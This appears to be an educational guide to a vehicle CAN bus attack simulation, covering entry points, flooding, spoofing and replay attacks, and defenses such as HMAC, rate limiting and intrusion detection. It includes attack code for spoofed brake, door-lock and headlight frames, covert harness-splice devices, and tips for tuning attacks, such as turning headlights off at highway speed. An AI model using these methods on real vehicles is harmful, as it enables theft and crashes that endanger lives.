# CAN Bus Attack Scenarios & Access Points

## 🔍 Attack Vector Deep Dive

This guide details **exactly how** an attacker would compromise a vehicle's CAN bus and **where** these attacks occur physically and logically.

---

## 🚪 Physical Access Points

### 1. OBD-II Port (Most Common)

**Location**: Under steering wheel, left of pedals

**Physical Access**:
```
Driver's seat → Reach under dashboard → OBD-II port (standardized 16-pin connector)
```

**What Attacker Plugs In**:
- Bluetooth OBD-II dongle (looks like legitimate diagnostic tool)
- Raspberry Pi with CAN interface
- Commercial hacking tools (CANtact, ValueCAN)

**Attack Timeline**:
1. **5 seconds**: Plug in device
2. **30 seconds**: Device scans CAN bus, identifies ECU addresses
3. **1 minute**: Begin attack (flooding, spoofing, replay)

**Real-World Scenario**:
- Valet parking attendant plugs in device
- Car thief uses unlock device
- "Free diagnostic scan" at mall parking lot

**Why It's Dangerous**:
- **Full read/write access** to all CAN traffic
- No authentication required
- Legally mandated port (can't be removed)

---

### 2. Headlight/Taillight Harnesses

**Location**: Behind wheel well liners, accessible from outside

**Physical Access**:
```
Wheel well → Remove plastic liner → Access light harness → Splice wires
```

**Attack Method**:
- Cut CAN-High and CAN-Low wires
- Insert malicious ECU inline (man-in-the-middle)
- Original lights still work, owner unaware

**What Gets Compromised**:
- Body Control Module (BCM) messages
- Door locks, windows, alarm system
- Can pivot to other CAN domains

**Attack Hardware**:
- Arduino with MCP2515 CAN controller ($15)
- Hidden inside wheel well, powered by vehicle battery
- Remotely activated via cellular modem

**Real Scenario**:
- Car parked overnight
- Attacker spends 10 minutes installing device
- Can unlock doors remotely anytime

---

### 3. Infotainment System

**Location**: Center console, removable with basic tools

**Physical Access**:
```
Dashboard → Remove trim panels → Disconnect infotainment → Access CAN gateway
```

**Why It's a Target**:
- Often connected to internet (Wi-Fi, cellular)
- Bridge between external network and internal CAN
- Least security hardening (not safety-critical)

**Attack Path**:
```
Internet → Infotainment ECU → CAN Gateway → Powertrain CAN → Brakes/Engine
```

**Historical Example**:
- 2015 Jeep Cherokee: Hacked via Uconnect cellular connection
- Attackers sent CAN messages to disable brakes at highway speeds

---

### 4. Telematics Control Unit (TCU)

**Location**: Hidden under dashboard or in trunk

**Remote Access** (No Physical Required):
```
Cellular Network → TCU → CAN Gateway → Vehicle Systems
```

**Attack Vector**:
1. Exploit vulnerability in TCU firmware
2. Gain code execution on TCU
3. TCU has direct CAN bus access
4. Send arbitrary CAN messages

**What Makes TCUs Vulnerable**:
- Complex software (millions of lines of code)
- Internet-connected (attack surface)
- Often use outdated operating systems
- Rarely updated by manufacturers

---

## 🌐 Wireless Attack Vectors

### 1. Cellular (4G/5G)

**Target Systems**:
- Remote start/stop
- Stolen vehicle recovery
- Over-the-air software updates

**Attack Methodology**:

**Step 1: Identify Target**
- Find vehicle's VIN or IMEI
- Locate cellular network registration

**Step 2: Exploit TCU**
```
Attacker → Cellular network → TCU software vulnerability → Shell access
```

**Step 3: Access CAN Bus**
```python
# Attacker's code running on TCU
import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Send malicious message
msg = can.Message(arbitration_id=0x0A0, data=[0x00])  # Disable brakes
bus.send(msg)
```

**Real Attack - 2015 Jeep Cherokee**:
1. Researchers found Sprint cellular vulnerability
2. Exploited Uconnect system remotely
3. Gained CAN bus access
4. Disabled brakes, controlled steering
5. **1.4 million vehicles recalled**

---

### 2. Bluetooth

**Range**: 10-30 meters (parking lot attack)

**Target**: Hands-free calling, audio streaming

**Attack Scenario - Parking Lot**:
```
Attacker's laptop in parked car nearby
    ↓ Bluetooth connection
Target vehicle's Bluetooth module
    ↓ Exploit vulnerability
Infotainment ECU
    ↓ CAN gateway
Vehicle systems compromised
```

**Exploitation**:
- BlueBorne vulnerability (CVE-2017-0781)
- No user interaction required
- Can spread like a worm to nearby vehicles

**What Attacker Sees**:
- Bluetooth device name: "MyCarAudio"
- Pair without PIN (some implementations)
- Inject malformed packets → Code execution

---

### 3. Wi-Fi (Tesla, Luxury Vehicles)

**Range**: 50-100 meters

**Purpose**: Software updates, media streaming

**Attack Vector**:
1. Create fake Wi-Fi hotspot: "Tesla_Update"
2. Vehicle auto-connects (if configured)
3. Intercept/modify update packages
4. Install malicious firmware

**Tesla-Specific**:
- Web browser in car (attack via malicious website)
- Gaming system (potential exploit path)

---

### 4. Key Fob Relay Attack

**Attack Setup**:
```
[Attacker 1 near house]     [Attacker 2 near car]
      ↓ Relay signal ↓
[Key fob inside house] ←—radio—→ [Car thinks key is nearby]
```

**Result**:
- Unlock doors
- Start engine
- Access OBD-II port
- Full CAN bus access

**Why It Works**:
- Passive keyless entry (no button press needed)
- Car constantly listening for key
- No distance authentication

---

## 🎯 Attack Implementations in This Simulation

### Attack 1: Bus Flooding (Priority Hijack)

**Real-World Equivalent**: Denial-of-Service attack

**How It Works**:
```python
# Send highest priority message continuously
while True:
    frame = CANFrame(
        arbitration_id=0x000,  # Highest priority
        data=b'\xFF' * 8
    )
    bus.send(frame)
    time.sleep(0.0001)  # 10,000 messages/second
```

**What Happens**:
1. Attacker floods bus with ID 0x000 (highest priority)
2. CAN arbitration always picks 0x000 first
3. Legitimate messages (brakes, steering) starved
4. Bus effectively paralyzed

**Physical Manifestation**:
- **Brakes**: Pedal pressed, nothing happens (no CAN message gets through)
- **Steering**: Power steering disabled
- **Engine**: May stall (no sensor data transmitted)

**Where This Occurs**:
- Attacker device plugged into OBD-II port
- Hidden device spliced into wiring harness
- Compromised ECU sending malicious traffic

---

### Attack 2: Message Spoofing

**Real-World Equivalent**: Command injection

**Specific Targets**:

#### Target 1: Brake Pressure (ID 0x0A0)
```python
# Tell brake system: "No pressure needed"
frame = CANFrame(
    arbitration_id=0x0A0,
    data=b'\x00'  # Pressure = 0
)
```

**Result**: 
- Brake ECU receives "no braking" signal
- ABS module doesn't engage
- Vehicle doesn't slow down despite pedal pressed

**Critical Scenario**:
```
Highway driving at 70 MPH
    ↓ Driver presses brake
Brake ECU receives spoofed message (pressure=0)
    ↓ Brakes don't engage
Crash inevitable
```

#### Target 2: Door Locks (ID 0x300)
```python
frame = CANFrame(
    arbitration_id=0x300,
    data=b'\x00'  # Unlocked
)
```

**Result**: All doors unlock

#### Target 3: Lights (ID 0x301)
```python
frame = CANFrame(
    arbitration_id=0x301,
    data=b'\x00'  # Lights off
)
```

**Result**: Headlights/taillights turn off (safety hazard)

**Where This Occurs**:
- Compromised Body Control Module
- Malicious device on CAN bus
- Man-in-the-middle device in harness

---

### Attack 3: Replay Attack

**Real-World Equivalent**: Session hijacking

**Step 1: Capture Traffic**
```python
# Attacker records legitimate messages
captured_messages = []

def capture(frame):
    if frame.arbitration_id == 0x100:  # Engine RPM
        captured_messages.append(frame)
```

**Step 2: Replay Later**
```python
# Replay old RPM data
for msg in captured_messages:
    bus.send(msg)  # Send stale data
```

**What Happens**:
- Transmission ECU receives old RPM values
- Thinks engine is at 3000 RPM (actually at 6000 RPM)
- Shifts gears at wrong time
- Engine damage or stall

**More Dangerous Replay**:
```python
# Capture "brakes OK" status message
# Replay when brakes are actually failing
frame = CANFrame(
    arbitration_id=0x0A1,
    data=b'\x01'  # Brakes status: OK
)
```

**Result**: Dashboard shows brakes functional when they're not

---

## 🛡️ How Security Measures Block These Attacks

### Encryption (AES-128)

**Blocks**:
- ✅ Eavesdropping (attacker can't read messages)
- ⚠️ Spoofing (partially - attacker sends unencrypted messages, receivers reject)
- ❌ Replay (encrypted message can be replayed)

**How It Works**:
```python
# Sender
plaintext = b'\x0B\xB8'  # RPM = 3000
encrypted = AES.encrypt(plaintext)  # Random IV each time

# Receiver
decrypted = AES.decrypt(encrypted)
if decrypted is None:
    discard_message()  # Decryption failed = attack
```

---

### HMAC Authentication

**Blocks**:
- ❌ Eavesdropping (doesn't encrypt)
- ✅ Spoofing (attacker can't forge valid MAC)
- ⚠️ Replay (valid message can be replayed)

**How It Works**:
```python
# Sender
message = b'\x0A\x00'  # Brake pressure = 0
mac = HMAC(secret_key, message)
send(message + mac)

# Receiver
received_message, received_mac = split(data)
expected_mac = HMAC(secret_key, received_message)
if received_mac != expected_mac:
    discard_message()  # Tampered or forged
```

**Why Spoofing Fails**:
- Attacker doesn't know secret_key
- Can't generate valid MAC
- All spoofed messages rejected

---

### Rate Limiting

**Blocks**:
- ❌ Eavesdropping
- ❌ Spoofing (if encrypted/authenticated)
- ✅ Bus Flooding
- ⚠️ Replay (blocks burst replays)

**How It Works**:
```python
message_counts = {}

def check_rate(arb_id):
    recent_count = count_messages_in_last_second(arb_id)
    if recent_count > 50:  # Threshold
        return False  # Block message
    return True
```

**Why Bus Flooding Fails**:
- Attacker sends 10,000 messages/second
- Rate limiter detects >50/second
- Blocks all excess messages
- Legitimate traffic flows normally

---

### Intrusion Detection (IDS)

**Blocks**:
- ❌ Eavesdropping
- ❌ Single spoofed messages
- ✅ Anomalous patterns (flooding, unusual frequency)
- ⚠️ Replay (detects duplicate patterns)

**How It Works**:
```python
# Learning phase: establish baseline
baseline = {
    0x100: {'avg_interval': 0.05},  # RPM every 50ms
    0x200: {'avg_interval': 0.08}   # Gear every 80ms
}

# Detection phase
def check_anomaly(arb_id, timestamp):
    interval = timestamp - last_message_time[arb_id]
    if interval < baseline[arb_id]['avg_interval'] / 3:
        alert("Anomaly detected!")  # 3x faster than normal
```

**Why Replay Fails**:
- Replayed messages come in rapid bursts
- IDS detects frequency 3x higher than baseline
- Raises alert (doesn't block, just warns)

---

## 📊 Attack Effectiveness Matrix

| Security Measure | Bus Flooding | Spoofing | Replay |
|-----------------|--------------|----------|--------|
| **None** | 100% success | 100% success | 100% success |
| **Encryption Only** | No effect | Detected (unencrypted rejected) | No effect |
| **HMAC Only** | No effect | **BLOCKED** | Detected |
| **Rate Limit Only** | **BLOCKED** | No effect | Burst blocked |
| **IDS Only** | Detected | No effect | Detected |
| **All Combined** | **BLOCKED** | **BLOCKED** | **BLOCKED** |

---

## 🚨 Critical Safety Scenarios

### Scenario 1: Emergency Braking Failure

**Attack**: Spoofing (Brake Pressure = 0)

**Timeline**:
```
T+0.0s: Driver sees obstacle, presses brake pedal
T+0.1s: Brake pedal sensor sends signal to Brake ECU
T+0.2s: Attacker spoofs "pressure=0" message
T+0.3s: Brake ECU receives spoofed message instead
T+0.4s: No hydraulic pressure applied to brakes
T+1.0s: Crash occurs (vehicle didn't slow down)
```

**With HMAC Authentication**:
```
T+0.2s: Attacker spoofs "pressure=0" message (no valid MAC)
T+0.3s: Brake ECU rejects spoofed message (invalid MAC)
T+0.3s: Legitimate brake signal arrives with valid MAC
T+0.4s: Brakes engage normally
T+2.0s: Vehicle stops safely
```

---

### Scenario 2: Highway Bus Flooding

**Attack**: Priority Hijack (ID 0x000)

**Timeline**:
```
T+0.0s: Vehicle cruising at 70 MPH
T+0.1s: Attacker starts flooding bus with ID 0x000
T+0.2s: All legitimate messages starved (can't transmit)
T+0.5s: Engine ECU loses communication with sensors
T+1.0s: Transmission locks in current gear (no data)
T+2.0s: Brakes unresponsive (no CAN messages)
T+5.0s: Driver loses control
```

**With Rate Limiting**:
```
T+0.1s: Attacker starts flooding
T+0.2s: Rate limiter detects >50 messages/sec on ID 0x000
T+0.3s: Blocks all 0x000 messages beyond threshold
T+0.4s: Legitimate traffic flows normally
T+5.0s: Vehicle operates safely
```

---

## 🔧 How to Adjust Attack Instructions

The simulation can be modified to target different systems:

### Make Doors Not Lock
```python
# In can_bus_attacks.py, SpoofingAttack class
self.targets = {
    0x300: b'\x00',  # Change from b'\x01' (locked) to b'\x00' (unlocked)
}
```

### Delay Brake Response
```python
# Add artificial delay before brake message
import time

def delayed_brake_attack():
    time.sleep(0.5)  # 500ms delay
    send_brake_command()
```

### Disable Headlights on Highway
```python
# Target headlight control ID
self.targets = {
    0x301: b'\x00',  # Lights off
}

# Trigger at high speed
if current_speed > 60:  # MPH
    bus.send(lights_off_message)
```

---

## 🎯 Where Attacks Occur (Network Topology)

```
[External World]
      ↓
[Wireless/OBD-II Entry Point]  ← Attacker gains access here
      ↓
[CAN Gateway ECU]
      ↓
[High-Speed CAN Bus]  ← Attacks occur here
      ↓
┌─────────┬──────────┬───────────┬─────────┐
Engine   Brakes   Transmission  Body
ECU      ECU      ECU          Control
                                ECU
```

**Attack Injection Points**:
1. **OBD-II Port** → Direct to CAN Gateway
2. **Infotainment** → Through Gateway to Powertrain CAN
3. **Harness Splice** → Man-in-the-middle on CAN wires
4. **Compromised ECU** → Legitimate node turned malicious

---

## 📚 Additional Resources

### Tools Used in Real Attacks
- **CANtact**: USB-to-CAN adapter ($60)
- **Wireshark**: CAN traffic analysis
- **can-utils**: Linux CAN toolkit
- **ICSim**: ICS CAN simulator

### Notable Vulnerabilities
- **CVE-2015-5611**: Jeep Cherokee remote hack
- **CVE-2017-14937**: Nissan Leaf command injection
- **CVE-2019-9764**: BMW ConnectedDrive vulnerabilities

---

## ⚠️ Legal Warning

These techniques are demonstrated **for educational purposes only**.

**DO NOT**:
- Access any vehicle's systems without authorization
- Install devices on vehicles you don't own
- Intercept or modify vehicle communications
- Use these tools outside of simulation environments

**Penalties for unauthorized access**:
- Federal: Computer Fraud and Abuse Act (up to 10 years prison)
- State: Varies by jurisdiction
- Civil: Liability for damages/injuries

---

**Remember**: The goal is to understand vulnerabilities to build **more secure vehicles**, not to exploit them.